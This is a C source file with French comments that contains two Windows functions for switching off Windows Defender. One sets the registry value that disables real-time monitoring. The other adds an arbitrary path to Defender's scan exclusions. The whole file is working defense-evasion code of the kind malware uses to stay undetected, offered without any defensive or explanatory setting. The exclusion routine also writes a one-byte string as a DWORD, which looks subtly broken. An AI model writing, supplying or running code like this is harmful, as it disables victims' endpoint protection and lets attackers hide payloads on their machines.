
#include <windows.h>
#include <stdio.h>

int disable_av()
{
    HKEY hKey;
    DWORD disableRealtime = 1; // 1 = Désactivé, 0 = Activé

    // Ouvrir la clé "Real-Time Protection" de Windows Defender
    LONG result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
        0,
        KEY_WRITE,
        &hKey);

    if (result == ERROR_SUCCESS)
    {
        // Désactiver la protection en temps réel
        result = RegSetValueEx(
            hKey,
            "DisableRealtimeMonitoring",
            0,
            REG_DWORD,
            (const BYTE *)&disableRealtime,
            sizeof(disableRealtime));

        if (result == ERROR_SUCCESS)
        {
            printf("[+] Protection en temps réel désactivée avec succès.\n");
        }
        else
        {
            printf("[-] Erreur: Impossible de modifier la valeur (Code: %d).\n", result);
        }

        RegCloseKey(hKey);
    }
    else
    {
        printf("[-] Erreur: Impossible d'ouvrir la clé de registre (Code: %d).\n", result);
        printf("[?] Essayez de lancer le programme en tant qu'administrateur.\n");
    }

    return 0;
}

int exclude_av(char *excludedPath)
{
    HKEY hKey;

    // Ouvrir la clé des exclusions
    LONG result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0,
        KEY_WRITE,
        &hKey);

    if (result == ERROR_SUCCESS)
    {
        // Ajouter l'exclusion
        result = RegSetValueEx(
            hKey,
            excludedPath,
            0,
            REG_DWORD,
            (const BYTE *)"0",
            1);

        if (result == ERROR_SUCCESS)
        {
            printf("Exclusion ajoutée avec succès.\n");
        }
        else
        {
            printf("Erreur: Impossible d'ajouter l'exclusion (%d).\n", result);
        }

        RegCloseKey(hKey);
    }
    else
    {
        printf("Erreur: Impossible d'accéder au registre (%d).\n", result);
    }

    return 0;
}